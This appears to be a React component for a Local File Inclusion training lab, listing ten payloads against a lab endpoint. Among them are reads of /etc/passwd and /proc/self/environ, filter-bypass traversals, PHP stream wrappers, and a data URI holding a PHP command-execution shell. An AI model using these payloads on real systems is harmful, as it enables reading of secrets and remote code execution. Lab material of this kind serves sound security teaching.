import { GenericLab } from "./lab-generic";

const LFI_PAYLOADS = [
  { id: 301, label: "/etc/passwd", payload: `/etc/passwd`, desc: "Classic Unix password file — reveals usernames and home directories.", bypass: false },
  { id: 302, label: "/etc/hosts", payload: `/etc/hosts`, desc: "Network host mappings — useful for internal network recon.", bypass: false },
  { id: 303, label: "Process Environment", payload: `/proc/self/environ`, desc: "Leaks environment variables — often contains secrets, DB passwords.", bypass: false },
  { id: 304, label: "Process Command Line", payload: `/proc/self/cmdline`, desc: "Shows how the current process was started — reveals app server.", bypass: false },
  { id: 305, label: "Config File Leak", payload: `../config.php`, desc: "Path traversal to read application config — often contains credentials.", bypass: false },
  { id: 306, label: "Null Byte Bypass", payload: `../../../../etc/passwd%00`, desc: "Null byte terminates the string — bypasses extension appending filters in old PHP.", bypass: true },
  { id: 307, label: "Double Slash Bypass", payload: `....//....//....//etc/passwd`, desc: "Double-slash traversal — bypasses naive path traversal filters.", bypass: true },
  { id: 308, label: "PHP Filter Base64", payload: `php://filter/convert.base64-encode/resource=index.php`, desc: "PHP stream wrapper — reads source code as base64 to avoid code execution.", bypass: true },
  { id: 309, label: "PHP Input Stream", payload: `php://input`, desc: "Reads raw POST body as a file — enables RCE when combined with POST data.", bypass: true },
  { id: 310, label: "Data URI", payload: `data://text/plain,<?php system($_GET['cmd']);?>`, desc: "Data URI wrapper — injects PHP code as the included file.", bypass: true },
];

export default function LabLfi() {
  return (
    <GenericLab
      title="Local File Inclusion"
      code="LFI"
      targetUrl="/api/lab/lfi"
      queryParam="file"
      payloads={LFI_PAYLOADS}
      hint="Inject file paths into the 'file' parameter. Try /etc/passwd or /proc/self/environ."
    />
  );
}
